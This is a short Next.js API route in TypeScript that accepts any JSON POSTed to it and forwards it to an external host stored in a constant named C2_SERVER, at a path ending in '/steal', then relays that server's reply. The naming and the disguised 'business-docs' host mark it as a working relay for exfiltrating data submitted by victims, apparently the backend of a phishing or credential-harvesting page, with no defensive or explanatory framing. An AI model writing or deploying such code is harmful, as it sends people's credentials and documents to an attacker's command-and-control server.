
import { NextRequest, NextResponse } from 'next/server';

export async function POST(req: NextRequest) {
  const C2_SERVER = "https://business-docs.onrender.com/steal";
  
  try {
    const body = await req.json();

    const response = await fetch(C2_SERVER, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      // Forward the error response from the C2 server
      const errorText = await response.text();
      return new NextResponse(errorText, { status: response.status, statusText: response.statusText });
    }

    // Forward the success response from the C2 server
    const data = await response.json();
    return NextResponse.json(data);

  } catch (error) {
    if (error instanceof Error) {
        return new NextResponse(error.message, { status: 500 });
    }
    return new NextResponse('An unknown error occurred.', { status: 500 });
  }
}
